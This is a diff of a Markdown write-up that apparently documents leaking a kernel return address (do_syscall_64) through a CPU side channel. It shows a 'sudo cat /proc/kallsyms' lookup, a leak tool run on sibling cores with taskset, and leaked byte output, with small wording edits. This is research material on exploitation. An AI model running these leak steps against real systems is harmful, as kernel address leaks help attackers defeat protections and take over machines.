@@ -1,5 +1,4 @@
-1. Find our target to leak, which is a return address, loaded from stack and then quickly override by another call
-
+1. Find our target to leak, which is a return address, and soon, overwritten by another call
 ```
 sudo cat /proc/kallsyms | grep do_syscall_64
 ffffffffb9deca90 T do_syscall_64
@@ -56,7 +55,8 @@ static __always_inline bool do_syscall_x64(struct pt_regs *regs, int nr) // inli
 ```
 $ taskset -c "35" ./uname & taskset -c "71" ./leak 0xcad0
 
-using suffix 0xcad0028 0x1c 1
+using suffix 0xcad00
+28 0x1c 1
 082 0x52 1
 129 0x81 7
 140 0x8c 1
